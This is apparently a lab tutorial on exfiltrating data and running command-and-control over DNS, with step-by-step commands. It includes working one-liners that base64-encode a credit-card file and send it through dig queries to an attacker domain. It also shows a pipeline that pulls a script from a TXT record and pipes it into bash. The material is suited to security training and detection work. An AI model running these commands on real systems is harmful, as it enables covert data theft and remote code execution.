# Exfiltration Over DNS

The DNS protocol is a common protocol primarily used to resolve domain names to IP addresses and vice versa. Although not designed for data transfer, threat actors have found ways to abuse it for data exfiltration. This document explains the technique of exfiltrating data over the DNS protocol.

---

## What is DNS Data Exfiltration?

DNS is not a transport protocol, and many organizations don't regularly monitor it. Since DNS traffic is allowed in most firewalls, threat actors use it to hide their communications.

### DNS Protocol Limitations

- The maximum length of a Fully Qualified Domain Name (FQDN) is 255 characters (including separators).
- A subdomain name (label) cannot exceed 63 characters.

Due to these limitations, transferring large files (e.g., 10 MB) may require over 50,000 DNS requests, creating noisy traffic that is easier to detect.

---

## Data Exfiltration - Data Flow

1. **Domain Registration**: The attacker registers a domain (e.g., `tunnel.com`).
2. **NS Record Setup**: The attacker sets up the domain's NS record to point to their controlled server.
3. **Data Transfer**: Malware or the attacker sends sensitive data as part of a domain name (e.g., `passw0rd.tunnel.com`).
4. **DNS Request**: The DNS request is forwarded through the local DNS server to the attacker's authoritative DNS server.
5. **Data Extraction**: The attacker extracts the data from the domain name.

---

## When to Use DNS Data Exfiltration?

DNS exfiltration is useful when firewalls block all other traffic but allow DNS. It enables data transfer through firewalls as long as DNS resolution is permitted.

---

## Performing DNS Data Exfiltration

### Requirements

- A domain name controlled by the attacker (e.g., `tunnel.com`).
- A victim machine with sensitive data to exfiltrate.
- An attacker machine to receive and process DNS requests.

### Steps

#### 1. Prepare the Attacker Machine

- Connect to the attacker machine via SSH:
    ```bash
    ssh thm@attacker.thm.com
    ```
- Capture incoming DNS requests using `tcpdump`:
    ```bash
    sudo tcpdump -i eth0 udp port 53 -v
    ```

#### 2. Connect to the Victim Machine

- Access the victim machine via SSH:
    ```bash
    ssh thm@victim2.thm.com
    ```

#### 3. Encode the Data

- Encode the content of `credit.txt` using Base64:
    ```bash
    cat task9/credit.txt | base64
    ```

#### 4. Split and Send Data

- Split the Base64 data into multiple DNS requests:
    ```bash
    cat task9/credit.txt | base64 | tr -d "\n" | fold -w18 | sed -r 's/.*/&.att.tunnel.com/'
    ```
- Alternatively, send the data in a single DNS request:
    ```bash
    cat task9/credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/
    ```
- Use the `dig` command to send the DNS requests:
    ```bash
    cat task9/credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
    ```

#### 5. Receive and Decode Data

- On the attacker machine, stop `tcpdump` and clean the received data:
    ```bash
    echo "TmFtZTogVEhNLXVzZX..." | cut -d"." -f1-8 | tr -d "." | base64 -d
    ```

---

## C2 Communications Over DNS

Command-and-Control (C2) frameworks use DNS for communication, such as sending commands and receiving results. They may also use TXT DNS records to deliver scripts or additional payloads.

### Example: Executing a Bash Script via DNS

1. **Encode the Script**:
     ```bash
     cat /tmp/script.sh | base64
     ```
2. **Add a TXT Record**: Add the Base64-encoded script to a TXT DNS record (e.g., `script.tunnel.com`).
3. **Resolve the TXT Record**:
     ```bash
     dig +short -t TXT script.tunnel.com
     ```
4. **Execute the Script**:
     ```bash
     dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
     ```

---

By following these steps, you can simulate DNS-based data exfiltration and C2 communications.